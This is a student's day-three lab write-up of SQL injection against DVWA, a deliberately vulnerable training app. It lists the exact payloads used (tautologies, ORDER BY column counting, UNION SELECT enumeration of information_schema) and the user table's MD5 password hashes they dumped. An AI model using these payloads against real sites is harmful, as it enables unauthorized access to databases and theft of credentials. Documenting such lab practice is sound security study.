# Month 2 - Week 1 Day 3: SQL Injection (DVWA)

## What is SQL Injection
SQL Injection happens when user input is inserted directly into a SQL query without being properly checked, allowing an attacker to change the logic of that query.

## Setup
- Target: DVWA SQL Injection page, Security Level: Low
- Normal query behind the scenes: SELECT first_name, last_name FROM users WHERE user_id = '1';

## Step 1: Basic Injection Test
Command entered: 1' OR '1'='1
What it did: Changed the query to: SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
Why it worked: '1'='1' is always true, so the OR condition made every row in the table match, dumping all 5 users instead of just one.

## Step 2: Proving the Logic (Control Test)
Command entered: 1' OR '1'='2
Result: Only admin was returned.
Why: '1'='2' is false, so the OR added nothing - only the original user_id='1' condition mattered. This confirmed it was specifically the TRUE condition causing the dump, not just the OR keyword.

## Step 3: Finding the Number of Columns
Command entered: 1' ORDER BY 1-- -   -> worked
Command entered: 1' ORDER BY 2-- -   -> worked
Command entered: 1' ORDER BY 3-- -   -> ERROR: Unknown column '3' in 'order clause'
Conclusion: The users table query returns exactly 2 columns.

## Step 4: Confirming Column Positions with UNION
Command entered: 1' UNION SELECT 1,2-- -
Result: Got back "1" and "2" as fake first_name/surname, alongside the real admin row.
Why: This confirmed our injected data appears in both column 1 and column 2, so we know exactly where to place extracted data.

## Step 5: Extracting Database Name and Version
Command entered: 1' UNION SELECT database(), version()-- -
Result: Database name = dvwa, Version = 10.1.26-MariaDB-0+deb9u1
Why this matters: Knowing the exact database version lets an attacker search for known vulnerabilities (CVEs) specific to that version.

## Step 6: Finding Table Names
Command entered: 1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()-- -
Result: Found two tables - guestbook and users
Why: information_schema is a built-in MySQL database that stores metadata about every other database and table on the server.

## Step 7: Finding Column Names Inside the users Table
Command entered: 1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'-- -
Result: Found columns - user_id, first_name, last_name, user, password

## Step 8: Extracting Usernames and Password Hashes
Command entered: 1' UNION SELECT user, password FROM users-- -
Result:
admin - 5f4dcc3b5aa765d61d8327deb882cf99
gordonb - e99a18c428cb38d5f260853678922e03
1337 - 8d3533d75ae2c3966d7e0d4fcc69216b
pablo - 0d107d09f5bbe40cade3de5c71e9e9b7
smithy - 5f4dcc3b5aa765d61d8327deb882cf99

Observation: admin and smithy have the exact same hash, meaning they share the same password.

## What These Hashes Are
These are MD5 hashes - a weak, outdated hashing algorithm. MD5 is considered broken for passwords because:
1. It's extremely fast to compute, allowing billions of guesses per second
2. It has no "salt", so identical passwords always produce identical hashes
3. Precomputed "rainbow tables" exist that can crack common MD5 hashes instantly

## What I Learned Today
honestly, i'm still confused a bit here because i've not fully grasped how SQL injection actually works, but one thing i properly understood today is that SQL injection is a cyberattack where malicious code is inserted into input fields on a website or application, tricking the backend database into executing unintended commands.
